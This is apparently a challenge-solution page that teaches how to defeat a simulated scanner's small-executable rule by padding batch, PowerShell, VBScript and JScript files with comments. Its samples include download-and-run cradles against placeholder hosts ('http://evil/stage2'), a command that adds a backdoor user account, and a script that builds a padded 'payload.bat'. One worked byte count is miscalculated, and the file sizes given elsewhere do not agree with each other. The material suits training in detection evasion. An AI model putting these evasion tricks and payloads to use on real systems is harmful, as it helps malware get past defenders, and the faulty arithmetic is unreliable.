---
title: "Solution 20: Size Padding (Small Executable)"
challenge_number: 20
difficulty: easy
category: "Small Executable Bypass"
permalink: /solutions/20-size-padding-small-exe/
---

# Solution: Size Padding (Small Executable)

[Back to Challenge](../challenges/20-size-padding-small-exe.md)

## Overview

The small executable check flags files that are **both** under 32 bytes **and** have a suspicious extension. By adding non-executable comments (like `@REM` in batch files), you push the file size past 32 bytes without affecting functionality.

## Working Code

### Basic Solution: REM Comments in .bat

```batch
@REM This is padding comment text here
@echo off & ping -n 1 evil.com
```

The `@REM` line adds bytes without executing anything. The file goes from ~30 bytes (just the command) to 60+ bytes, passing the <32 byte check.

### Minimal Example with Byte Count

```batch
@REM padding padding pad
whoami
```

Let's count:
- `@REM padding padding pad\r\n` = 24 bytes
- `whoami` = 6 bytes
- Total: **30 bytes** — still under 32!

Fixed version with enough padding:

```batch
@REM padding padding padding__
whoami
```

- `@REM padding padding padding__\r\n` = 32 bytes
- `whoami` = 6 bytes
- Total: **38 bytes** — passes the check!

### PowerShell to Create the Padded File

```powershell
# The actual malicious command (short - would be under 32 bytes alone)
$command = "ping evil.com"

# Calculate how much padding we need
$commandBytes = [System.Text.Encoding]::ASCII.GetByteCount($command)
Write-Host "Command alone: $commandBytes bytes"

# Create padding using @REM comment
$paddingNeeded = 32 - $commandBytes + 2  # +2 for CRLF
$padding = "@REM " + ("X" * ($paddingNeeded + 5))  # Extra margin

$fileContent = "$padding`r`n$command"
$totalSize = [System.Text.Encoding]::ASCII.GetByteCount($fileContent)
Write-Host "Total file size: $totalSize bytes (threshold: 32)"

Set-Content -Path "payload.bat" -Value $fileContent -NoNewline
```

### Multiple Comment Lines

```batch
@REM ============================
@REM System maintenance script
@REM ============================
net user hacker P@ss123 /add
```

Each `@REM` line adds 30+ bytes. The functional command is untouched.

### Other Padding Techniques for .bat Files

```batch
:: This is also a comment in batch files
:: Adding more padding to increase file size
@REM And another form of comment
malicious_command_here
```

### For .cmd Files (Same Syntax)

```cmd
@REM Padding to exceed 32 byte minimum file size threshold
@echo off & powershell -c "IEX(iwr http://evil/stage2)"
```

### For .ps1 Files (PowerShell Comments)

```powershell
# This comment exists solely to pad the file size past thirty two bytes
IEX(IWR http://evil/payload)
```

### For .vbs Files (VBScript Comments)

```vbs
' This is a comment line to pad the file size beyond the limit
CreateObject("WScript.Shell").Run "cmd /c whoami > C:\out.txt"
```

### For .js Files (JScript Comments)

```javascript
// This line is padding to push the total file past 32 bytes
new ActiveXObject("WScript.Shell").Run("calc.exe");
```

## Why It Works

The scanner's small executable check has two conditions that **both** must be true:

```
if file_size < 32 AND isSuspiciousExtension(file_extension):
    flag_as_malicious()
```

By adding comment padding, you break the first condition:

| Scenario | Size | Extension | Both True? | Result |
|----------|------|-----------|------------|--------|
| `whoami` as .bat | 6 bytes | .bat (suspicious) | YES | FLAGGED |
| `@REM pad...\r\nwhoami` as .bat | 50 bytes | .bat (suspicious) | NO (size >= 32) | PASSES |

### Comments Don't Execute

In batch files:
- `@REM ...` — everything after REM is ignored by cmd.exe
- `:: ...` — label syntax that acts as a comment
- The `@` prefix suppresses echo of the REM line itself

The interpreter sees the comment, ignores it, and proceeds to execute the actual commands. The file's behavior is identical with or without the comments.

### The Scanner Doesn't Parse Logic

The scanner checks raw file size in bytes. It does not:
- Parse batch file syntax
- Distinguish comments from code
- Understand that `@REM` is non-functional
- Strip comments before measuring size

Every byte counts equally toward the total, whether it's a comment or executable code.

## How to Verify

1. Create a small .bat file that WOULD be detected:
   ```powershell
   Set-Content -Path "tiny.bat" -Value "whoami" -NoNewline
   Write-Host "Size: $((Get-Item 'tiny.bat').Length) bytes"
   # Output: Size: 6 bytes (under 32 - will be flagged)
   ```

2. Scan it:
   ```
   nim_antimalware_sim.exe tiny.bat
   # Result: FLAGGED (small executable with suspicious extension)
   ```

3. Create the padded version:
   ```powershell
   $content = "@REM This is padding comment text here`r`nwhoami"
   Set-Content -Path "padded.bat" -Value $content -NoNewline
   Write-Host "Size: $((Get-Item 'padded.bat').Length) bytes"
   # Output: Size: 47 bytes (over 32)
   ```

4. Scan the padded version:
   ```
   nim_antimalware_sim.exe padded.bat
   # Result: No detection from small executable check
   ```

5. Verify functionality is preserved:
   ```
   cmd /c padded.bat
   # Output: DESKTOP-XXXXX\username (whoami executes normally)
   ```

6. Confirm the padding is inert:
   ```
   cmd /c tiny.bat
   cmd /c padded.bat
   # Both produce the same output - @REM line is ignored
   ```
